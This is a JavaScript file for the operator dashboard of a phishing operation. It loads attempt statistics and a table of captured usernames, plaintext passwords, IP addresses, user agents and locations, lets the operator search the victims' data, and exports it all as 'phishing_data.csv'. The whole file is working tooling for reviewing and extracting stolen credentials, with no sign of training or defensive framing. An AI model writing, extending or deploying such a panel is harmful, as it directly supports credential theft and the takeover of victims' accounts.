document.addEventListener('DOMContentLoaded', function() {
    
    fetch('/api/stats')
        .then(response => response.json())
        .then(data => {
            document.getElementById('totalAttempts').textContent = data.total_attempts;
            document.getElementById('uniqueIPs').textContent = data.unique_ips;
            document.getElementById('todayAttempts').textContent = data.today_attempts;
        });

    
    fetch('/api/captured-data')
        .then(response => response.json())
        .then(data => {
            const tableBody = document.getElementById('dataTable');
            tableBody.innerHTML = '';
            
            data.forEach(entry => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${entry.timestamp}</td>
                    <td>${entry.username}</td>
                    <td>${entry.password}</td>
                    <td>${entry.ip_address}</td>
                    <td>${entry.user_agent}</td>
                    <td>${entry.location}</td>
                `;
                tableBody.appendChild(row);
            });
        });

    
    document.getElementById('searchInput').addEventListener('input', function(e) {
        const searchTerm = e.target.value.toLowerCase();
        const rows = document.getElementById('dataTable').getElementsByTagName('tr');
        
        Array.from(rows).forEach(row => {
            const text = row.textContent.toLowerCase();
            row.style.display = text.includes(searchTerm) ? '' : 'none';
        });
    });

    
    document.querySelector('.export-btn').addEventListener('click', function() {
        fetch('/api/captured-data')
            .then(response => response.json())
            .then(data => {
                const csv = convertToCSV(data);
                downloadCSV(csv, 'phishing_data.csv');
            });
    });
});

function convertToCSV(data) {
    const headers = ['Timestamp', 'Username', 'Password', 'IP Address', 'User Agent', 'Location'];
    const rows = data.map(item => [
        item.timestamp,
        item.username,
        item.password,
        item.ip_address,
        item.user_agent,
        item.location
    ]);
    
    return [headers, ...rows]
        .map(row => row.join(','))
        .join('\n');
}

function downloadCSV(csv, filename) {
    const blob = new Blob([csv], { type: 'text/csv' });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    window.URL.revokeObjectURL(url);
} 